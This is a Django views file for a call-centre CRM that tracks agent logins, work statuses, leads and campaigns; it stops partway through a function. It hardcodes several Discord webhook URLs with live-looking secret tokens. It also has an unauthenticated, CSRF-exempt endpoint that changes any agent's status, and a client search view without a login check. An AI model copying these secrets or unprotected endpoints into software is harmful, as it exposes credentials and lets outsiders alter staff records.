from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse,HttpResponse
from django.core import serializers
from django.contrib.sessions.models import Session
from django.template.loader import render_to_string

import requests
from django.apps import apps
from .models import *
from admin.models import *
from datetime import datetime,timedelta
from pytz import timezone
import pytz
from django.utils import timezone as tz
from itertools import chain
from operator import attrgetter
import calendar
from django.utils.timezone import now
import asyncio
from core.discord_bot import queue_message as discord_private

def send_discord_message_application(content,application_id):
    url = 'https://discord.com/api/webhooks/1257253489684516864/vUivaW3T8m27tc2y9hrcX4K1GZYJdDgXT2gARoemRLUgaQI2LYbMYgPfdIxVZqsglb_C'
    headers = {'Content-Type': 'application/json'}
    mention1 = f'<@262585653072625665>'
    #mention2 = f'<@979390450865688596>'
    color = 65280
    
    application_link = "https://nedialo.app/application-view/"+ str(application_id)

    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
                'title':'Application Link Click here to view',
                'url': application_link,
            }
        ]
    }
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')
# Create your views here.
# TODO_LIST need to redirect login to first login team sheet
admin_users = ["admin","ahmedezzat"]
def parse_time_string(time_string):
    """Parses a time string that may exceed 24 hours."""
    parts = time_string.split(':')
    hours, minutes, seconds = int(parts[0]), int(parts[1]), int(parts[2])
    return timedelta(hours=hours, minutes=minutes, seconds=seconds)

def format_time_delta(time_delta):
    """Formats a timedelta object into HH:MM:SS, including hours that exceed 24."""
    total_seconds = int(time_delta.total_seconds())
    hours, remainder = divmod(total_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"


def formating_hours(hours):
    total_hours = (str(hours))
    components = total_hours.split(', ')

    if len(components) == 2:
        # If the time string contains two components (days and time), parse them separately
        days_part, time_part = components
        days = int(days_part.split()[0])  # Extract the number of days
    else:
        # If the time string contains only one component (time), assume 0 days
        time_part = components[0]
        days = 0
    
    # Extract hours, minutes, and seconds from the time part
    time_components = time_part.split(':')
    hours = int(time_components[0])
    minutes = int(time_components[1])
    seconds = int(time_components[2])
    
    # Convert days to hours and add to the hours component
    hours += days * 24
    
    # Format the time as HH:MM:SS
    total_hours = f'{hours:02}:{minutes:02}:{seconds:02}'

    return str(total_hours)



# views.py

from .signals import user_heartbeat_signal

@login_required
@csrf_exempt
def heartbeat_view(request):
    user = request.user
    user_heartbeat_signal.send(sender=None, user=user,request=request)
    return JsonResponse({'status': 'ok'})


@login_required(login_url="/login")
def update_status(request):
    if request.method == 'POST' and request.is_ajax():
        selected_status = request.POST.get('status')

        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        user = request.user
        profile = Profile.objects.get(user=user,active=True)
        full_name = profile.full_name
        userid = profile.userid

        if selected_status:
            status = WorkStatus.objects.create(user=user,profile=profile,userid=userid,full_name=full_name,
                                           status=selected_status,date=date,time=time)
            profile = Profile.objects.get(user=user)
            profile.work_status =  selected_status
            profile.save()

        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')

        # Construct the content of the embed with quote formatting
        request_ip = request.META.get('REMOTE_ADDR')
        content = f'**Agent:** {profile.full_name}\n\n**Action:** Changed Working Status to {selected_status.upper()}\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip}'
        try:
            send_discord_message(content)
        except:
            pass
        return JsonResponse({'message': 'Status updated successfully'}, status=200)

    return JsonResponse({'error': 'Invalid request'}, status=400)


@csrf_exempt
def change_work_status(request):
    if request.method == 'POST':
        userid = request.POST.get('userid')
        full_name = request.POST.get('full_name')
        selected_status = request.POST.get('status')
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        profile = get_object_or_404(Profile, userid=userid)
        user = profile.user
        
        # Create a new WorkStatus record
        WorkStatus.objects.create(
            user=user,
            profile=profile,
            userid=userid,
            status=selected_status,
            date=date,
            time=time
        )
        
        # Update the Profile work_status
        profile.work_status = selected_status
        profile.save()
        
        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')

        # Construct the content of the embed with quote formatting
        request_ip = request.META.get('REMOTE_ADDR')
        content = f'**Admin:** {Profile.objects.get(user=request.user).full_name}\n\n**Action:** Changed Working Status for **{profile.full_name}** to **{selected_status.upper()}**\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip}'
        try:
            send_discord_message(content)
        except:
            pass
        return JsonResponse({'success': True})
    return JsonResponse({'success': False})


def get_profiles_status(request):
    profiles = Profile.objects.all().values('userid', 'work_status')
    profiles_list = list(profiles)
    return JsonResponse(profiles_list, safe=False)

def get_current_status(request):
    profile = Profile.objects.get(user=request.user)  # Adjust this to select the correct profile
    return JsonResponse({'work_status': profile.work_status})






def send_discord_message(content):
    url = 'https://discord.com/api/webhooks/1250897057812578334/-eOMmjAMuELIit1smz_eXyWH_7gxVV1ejl9JUTF23vpa7V8jnEOG23CSEIng5DM6L7dX'
    headers = {'Content-Type': 'application/json'}
    mention1 = f'<@262585653072625665>'
    #mention2 = f'<@979390450865688596>'
    color = 65280
    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
            }
        ]
    }
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')


def send_discord_message_lead(content,lead):
    url = "https://discord.com/api/webhooks/1251226620484915260/ByYpYXCyT_amFXLe4Th7gG0HzN5bLbJEJneI1RBV1MYfHq5gGTwootTJ7kRHkO6qK3Zn"
    headers = {'Content-Type': 'application/json'}
    mention1 = f'<@262585653072625665>'
    #mention2 = f'<@979390450865688596>'
    mention3 = f'<@1144817547519201350>'
    lead_link = "https://nedialo.app/quality-lead/"+ str(lead)
    color = 65280
    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
                'title':'Lead Link Click here to view',
                'url': lead_link,
            }
        ]
    }
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')


def send_discord_message_requests(content,request,request_type):
    url = "https://discord.com/api/webhooks/1254196770431565894/WMXHSyIC-r5TRBtT-r-nTQpF635DaXpPNRAgw2oMeVC1hs25sBRgbQqEBUGis2Tat4Yl"
    headers = {'Content-Type': 'application/json'}
    mention1 = f'<@262585653072625665>'
    mention2 = f'<@979390450865688596>'
    mention3 = f'<@1144817547519201350>'
    mention4 = f'<@979421026976927785>'
    if request_type == "leave":
        color = 65280

        request_link = "https://nedialo.app/leave-handle/"+ str(request)
    elif request_type == "reschedule":
        color = 65280

        request_link = "https://nedialo.app/reschedule-handle/"+ str(request)
    elif request_type == "action":
        request_link = "https://nedialo.app/action-handle/"+ str(request)
        color = 16711680
    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
                'title':'Request Link Click here to Handle',
                'url': request_link,
            }
        ]
    }
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')

def discord_crm_login(agent_name, logged,request):

    if logged:
        action_text = "LOGGED IN"
        color = 65280  # Green color in Discord embed (decimal)
    else:
        action_text = "LOGGED OUT"
        color = 16711680  # Red color in Discord embed (decimal)
    
    url = 'https://discord.com/api/webhooks/1250899502089502795/UjD69vQzHqdF8bEmDLqdZU7-5ZXjnb3uPk-RvQNHZLCtw4-KbxXT2LBmJmxB5hq8CLCm'
    headers = {'Content-Type': 'application/json'}



    # Get current time in UTC
    utc_now = datetime.utcnow()

    # Get the timezone object for 'America/New_York'
    est_timezone = pytz.timezone('America/New_York')

    # Convert UTC time to Eastern timezone
    est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

    # Format the time as HH:MM:SS string
    est = est_time.strftime('%I:%M:%S %p')

    # Construct the content of the embed with quote formatting
    request_ip = request.META.get('REMOTE_ADDR')

    content = f'**Agent:** {agent_name}\n\n**Action:** {action_text}\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip}'

    # Construct the embed payload with color and content
    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
            }
        ]
    }

    # Send the POST request to the Discord webhook
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')



def discord_crm_timeout(agent_name,request):

    action_text = "Logged Out"
    color = 16711680  # Red color in Discord embed (decimal)
    
    url = 'https://discord.com/api/webhooks/1250899502089502795/UjD69vQzHqdF8bEmDLqdZU7-5ZXjnb3uPk-RvQNHZLCtw4-KbxXT2LBmJmxB5hq8CLCm'
    headers = {'Content-Type': 'application/json'}



    # Get current time in UTC
    utc_now = datetime.utcnow()

    # Get the timezone object for 'America/New_York'
    est_timezone = pytz.timezone('America/New_York')

    # Convert UTC time to Eastern timezone
    est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

    # Format the time as HH:MM:SS string
    est = est_time.strftime('%I:%M:%S %p')

    # Construct the content of the embed with quote formatting
    request_ip = request.META.get('REMOTE_ADDR')

    content = f'**Agent:** {agent_name}\n\n**Action:** Logged Out\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip}'

    # Construct the embed payload with color and content
    payload = {
        'embeds': [
            {
                'description': f' {content}',  # Using '>' for quote formatting
                'color': color,  # Setting the color based on 'logged' status
            }
        ]
    }

    # Send the POST request to the Discord webhook
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print('Message sent successfully')
    else:
        print(f'Failed to send message: {response.status_code}')



@login_required(login_url="/login")
def home(request):

    context = {}
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.agent_dashboard:
        if str(permissions) == "affiliate":
            username = str(profile.user)          
            return redirect("/affiliates/"+username)
        elif str(permissions) == "client":
            return redirect('/client-leads')
        elif str(permissions) == "batchservice":
            return redirect("/batchservice")
        else:
            return redirect("/access-denied")
    
    
    

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    request_ip = request.META.get('REMOTE_ADDR')
    
    
    
    teams = Team.objects.filter(active=True)

    affiliates = AffiliateUser.objects.filter(active=True)
    
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"



    if request.user.is_authenticated:
        if request.is_ajax():
            action = request.POST.get('action')
            if action == 'add':
                item = request.POST.get('item')
                if item:
                    todo = Todo.objects.create(todo=item, agent=request.user)
                    html = render_to_string('todo.html', {'todo': todo})
                    return JsonResponse({'html': html})
            elif action == 'toggle':
                todo_id = request.POST.get('todo_id')
                is_checked = request.POST.get('is_checked')
                if todo_id is not None and is_checked is not None:
                    todo = Todo.objects.get(id=todo_id)
                    todo.checked = is_checked.lower() == 'true'
                    todo.save()
                    return JsonResponse({'status': 'success'})
            elif action == 'remove':
                todo_id = request.POST.get('todo_id')
                if todo_id:
                    todo = Todo.objects.get(id=todo_id)
                    todo.active = False
                    todo.save()
                    return JsonResponse({'status': 'success'})

        todolist = Todo.objects.filter(agent=request.user, active=True)
        try:
            agent_performance = Performance.objects.get(agent=request.user,active=True)
        
            adherence = agent_performance.adherence
            quality = agent_performance.quality
            date = datetime.now(timezone('US/Eastern')).date()
            datem = int(date.strftime("%m"))
            datey = int(date.strftime("%Y"))
            
            actions = Action.objects.filter(agent=agent_performance.agent,status="approved",active=True, submission_date__month=datem, submission_date__year=datey)
            healthscore = Performance.objects.get(agent=agent_performance.agent, active=True)
            healthscore.health = len(actions)
            healthscore.save()
            health_object = int(agent_performance.health)
                
        except:
            quality = 100
            adherence = 100
            health_object = 0

        agent = Profile.objects.get(user=request.user)
        date = datetime.now(timezone('US/Eastern')).date()
        datem = int(date.strftime("%m"))
        datey = int(date.strftime("%Y"))

        time = datetime.now(timezone('US/Eastern')).time()


        agent_leads = [0,0,0]
        leads = Lead_Submission.objects.filter(agent=agent.user,pushed_date__month=datem, pushed_date__year=datey)
        for lead in leads:
            if lead.lead_status == "qualified":
                agent_leads[0] +=1
            elif lead.lead_status == "disqualified":
                agent_leads[1] +=1

        try:
            total_leads = agent_leads[0] + agent_leads[1]
            agent_leads[2] = (100*(agent_leads[0])) / total_leads
        except:
            if agent_leads[1] ==0 and agent_leads[0] != 0:
                agent_leads[2] = 100
            elif agent_leads[0] == 0:
                agent_leads[2] = 0
            else:
                agent_leads[2] = 0
        leads = int(agent_leads[2])


        work_hours = {}
        if permissions.work_status:
            agent = Profile.objects.get(user=request.user)
            


            #print(agents_hours)
            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()

            hours = WorkStatus.objects.filter(active=True,date=date,profile=agent)

            #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
            work_hours = {
                    'logged_in':"00:00:00",
                    'ready':"00:00:00",
                    'break':"00:00:00",
                    'meeting':"00:00:00",
                    'afk':"00:00:00",
                    'technical_issue':"00:00:00",
                    'end_shift':"00:00:00",
                    'logged_out':"00:00:00",
                    'total_hours':"00:00:00",
                    'total_paid_hours':"00:00:00",
                    }
            
            logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
            logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
            work_hours['logged_in'] = logged_in
            work_hours['logged_out'] = logged_out 
            time_format = '%H:%M:%S'
            
            past_status = 0
            past_status_started = 0
            for hour in hours:

                if past_status_started == 0:
                    past_status = str(hour.status)
                    past_status_started = str(hour.time.strftime("%H:%M:%S"))
                elif past_status_started !=0 :
                    current_status = hour.status
                    current_status_started = (hour.time).strftime("%H:%M:%S")

                    time1 = datetime.strptime(str(past_status_started), time_format)
                    time2 = datetime.strptime(str(current_status_started), time_format)
                    time_difference = time2 - time1
                    
                    if work_hours[past_status] == 0:
                        work_hours[past_status] = str(time_difference)
                        
                    else:
                        #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                        #total_working_after = datetime.strptime(str(time_difference), time_format)
                        #total_hours = total_working_before+total_working_after

                        time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                        # Split the time string into hours, minutes, and seconds
                        hours_str, minutes_str, seconds_str = time_str.split(':')

                        # Convert hours, minutes, and seconds to integers
                        hours = int(hours_str)
                        minutes = int(minutes_str)
                        seconds = int(seconds_str)

                        # Create a timedelta object
                        time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                        #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                        time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                        # Add timedelta objects together
                        total_hours = time_delta1 + time_delta2
                        

                        work_hours[past_status] = str(total_hours)

                    past_status = current_status
                    past_status_started = current_status_started
            ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
            break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
            meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
            afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
            technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
            # Add timedelta objects together
            work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
            work_hours['total_paid_hours'] = ready + meeting

       
        
  
        feedback = Feedback.objects.filter(active=True,agent_user=request.user,publish=True).last()

        payslip = AgentsPayslip.objects.filter(agent_profile=requestprofile,active=True,published=True).last()
        month = 0
        year = 0 
        if payslip:
            month = int(payslip.date.strftime("%m"))
            year = int(payslip.date.strftime("%Y"))

        context = { 'affiliates':affiliates,
                    'teams': teams,
                    'requestprofile':requestprofile,
                    'todolist': todolist,
                    "adherence":adherence,
                    "quality":quality,
                    "leads":leads,
                    "health":health_object,
                    'notifications':notifications,
                    'messages':messages,
                    "permissions":permissions,
                    'work_status':work_status,
                    'work_hours':work_hours,
                    'feedback':feedback,
                    'payslip':payslip,
                    'month':month,
                    'year':year,
                   }
        return render(request, "dashboard.html", context)
    else:
        return redirect('/login')
    
def loginview(request):


    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    if request.user.is_authenticated:
        profile = Profile.objects.get(user=request.user)
        if str(profile.permissions) == "client":
            return redirect('/client-leads')
        else:
            return redirect('/')
    else:
        if request.method == "POST":
            data = request.POST
            user=data.get('user')
            passw = data.get('pass')
            
            
            usera = authenticate(username=user,password=passw)
            if not usera:
                errormessage = "Wrong Username or Password."
                return render(request, "errors/error-404.html", context={"error_message":errormessage,})            

            userprofile = Profile.objects.get(user=usera)
            active = userprofile.active
            
            active_statuses = ["active","upl","annual","casual","sick"]
            inactive_statuses = ["inactive","dropped","blacklisted"]
            if not active or userprofile.status in inactive_statuses:
                errormessage = "Your Account has been suspended Please Contact Nedialo Admin."
                return render(request, "errors/error-403.html", context={"error_message":errormessage,})            
            if active and userprofile.status in active_statuses:
                    
                login(request,usera)
                date = datetime.now(timezone('US/Eastern')).date()
                time = datetime.now(timezone('US/Eastern')).time()
                request_ip = request.META.get('REMOTE_ADDR')
                Log.objects.create(request_ip=request_ip,date=date,user=usera,user_profile=userprofile,time=time,login=True,log_info="Agent Logged in")
                
                if str(userprofile.permissions) == "client":
                    return redirect('/client-leads')
                elif str(userprofile.permissions) == "batchservice":
                    return redirect("/batchservice")
                elif str(userprofile.permissions) == "affiliate":
                    username = str(userprofile.user)
                    return redirect("/affiliates/"+username)

                try:
                    discord_crm_login(userprofile.full_name,True,request)
                except:
                    pass

            return redirect("/")
        
        return render(request,"login.html")
@login_required
def clienthome(request):

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.client_dashboard:
        return redirect("/access-denied")

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    client = Client.objects.get(client_user=request.user)
    leads = Lead_Submission.objects.filter(client=client,pushed_date=date, active=True).order_by('-pushed_date', '-pushed_time')
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                    'affiliates':affiliates,
                    'teams': teams,
                    'requestprofile':requestprofile,
                    "leads":leads,
                    'notifications':notifications,
                    'messages':messages,
                    "permissions":permissions,
   
                   }
    return render(request,"client/client_home.html",context)

@login_required
def clientlookerstudio(request):

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.client_dashboard:
        return redirect("/access-denied")

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    client = Client.objects.get(client_user=request.user)
    client_looker = client.lookerstudio
    
    
    
    teams = Team.objects.filter(active=True)
    
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    client = Client.objects.get(client_user=request.user)
    affiliates = AffiliateUser.objects.filter(active=True)

    context = { 
                    'affiliates':affiliates,
                    'teams': teams,
                    'requestprofile':requestprofile,
                    'notifications':notifications,
                    'messages':messages,
                    "permissions":permissions,
                    'lookerstudio':client_looker,
   
                   }
    return render(request,"client/lookerstudio.html",context)
def clientsearch(request):

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.client_dashboard:
        return redirect("/access-denied")

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    client = Client.objects.get(client_user=request.user)
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                "profile":profile,
                "requestprofile":profile,
                    "teams":teams,
                    "today_date":date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    }
    if request.method == "POST":
        if 'search_by_name' in request.POST:
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            qualified = data.get('qualified')
            disqualified = data.get('disqualified')
            callback = data.get('callback')
            duplicate = data.get('duplicate')
            pending = data.get('pending')
            lead_results = {
                            "qualified": qualified,
                            "disqualified": disqualified,
                            "callback": callback,
                            "duplicate": duplicate,
                            "pending":pending,
                            }
            lead_results_active = []
            for result in lead_results:

                if str(lead_results[result]) == "None":
                    pass
                elif str(lead_results[result]) == "on":
                    lead_results_active.append(str(result)) 

            leads_searched = Lead_Submission.objects.filter(client=client, lead_status__in=lead_results_active, pushed_date__range=[start_date, end_date], active=True).order_by('-pushed_date', '-pushed_time')
                    
            context = {
                'affiliates':affiliates,
                "profile":profile,
                "requestprofile":profile,
                    "teams":teams,
                    "leads":leads_searched,
                    "today_date":date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    }
            return render(request, "client/client_searched.html",context)
        
        elif 'search_by_phone' in request.POST:
            data = request.POST
            number = data.get('phone_search')
            
            number = (((number.replace('(','')).replace(")","")).replace('-',"")).replace(" ","")

            leads_searched = Lead_Submission.objects.filter(client=client,seller_phone=number, active=True).order_by('-pushed_date', '-pushed_time')
                    
            context = {
                'affiliates':affiliates,
                "profile":profile,
                "requestprofile":profile,
                    "teams":teams,
                    "leads":leads_searched,
                    "today_date":date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,}

                    
            return render(request, "client/client_searched.html",context)


    return render(request, "client/client_search.html",context)
@login_required(login_url="/login")
def logoutview(request):
    name = Profile.objects.get(user=request.user).full_name
    try:
        discord_crm_login(name,False,request)
    except:
        pass
    logout(request)

    return redirect('/login')

def error404page(request):
    context ={}
    return render(request, "errors/error-404.html")

def default_404_page(request, exception):
    context ={'error_message':"Page not found !",}
    return render(request, "errors/error-404.html",context, status=404)
def default_500_page(request):
    context ={'error_message':"Page not found !",}
    return render(request, "errors/error-404.html",context, status=500)

def error403pageold(request):
    context = {}
    return render(request, "errors/error-403.html")

def error403page(request):
    return render(request, "errors/error-403.html")

def maintenancepage(request):
    context ={}
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return render(request, "errors/maintenance.html")
    else:
        return redirect('/login')



@login_required(login_url="/login")
def login_sheet(request,teamu):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.login_sheet:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    

    try:
        teamn = Team.objects.get(slug=teamu)
        team=teamn.team_name
    except:
        pass 
    
    
    profiles = Profile.objects.filter(team=teamn,active=True)
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    affiliates = AffiliateUser.objects.filter(active=True)
    
    context = {
                'affiliates':affiliates,
                'profiles':profiles,
               'teams': teams,
               'requestprofile':requestprofile,
               'teamname':team, 
               'notifications':notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
    }
    return render(request, 'login_sheet.html', context)



@login_required(login_url="/login")
def camp_guide(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.campaigns:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    name = Profile.objects.filter(user=request.user)[0].full_name
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)

    camps =  Campaign.objects.filter(status="active", active=True)
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                "teams":teams,
                'requestprofile':requestprofile,
                'camps':camps,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
    }

    return render(request, "camps/campaign_guidelines.html",context)

@login_required(login_url="/login")
def camp_info(request,id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    if not permissions.campaigns:
        return redirect("/access-denied")
    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    
    name = Profile.objects.filter(user=request.user)[0].full_name        
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)



    clients = Client.objects.filter(active=True)
    campaign = Campaign.objects.get(active=True,id=id)
    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
                "teams":teams,
                'requestprofile':requestprofile,
                'permissions':permissions,
                'camp':campaign,
                'work_status':work_status,
                }
    
    return render(request,'camps/camp_info.html',context)
        
        


@login_required(login_url="/login")
def paused_camp_guide(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.campaigns:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    name = Profile.objects.filter(user=request.user)[0].full_name        
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)

    camps =  Campaign.objects.filter(status="inactive", active=True)
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                "teams":teams,
                'requestprofile':requestprofile,
                'camps':camps,
                'notifications':notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,}
    
    
    return render(request, "camps/paused_campaign_guidelines.html",context)

@login_required(login_url="/login")
def pending_camp_guide(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.campaigns:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    name = Profile.objects.filter(user=request.user)[0].full_name        
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)


    camps =  Campaign.objects.filter(status="pending", active=True)
    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
                "teams":teams,
                'requestprofile':requestprofile,
                'camps':camps,
                'notifications':notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
    }
    
    return render(request, "camps/pendingcampaign_guidelines.html",context)



@login_required(login_url="/login")
def lead_post(request):

    profile = Profile.objects.get(user=request.user)
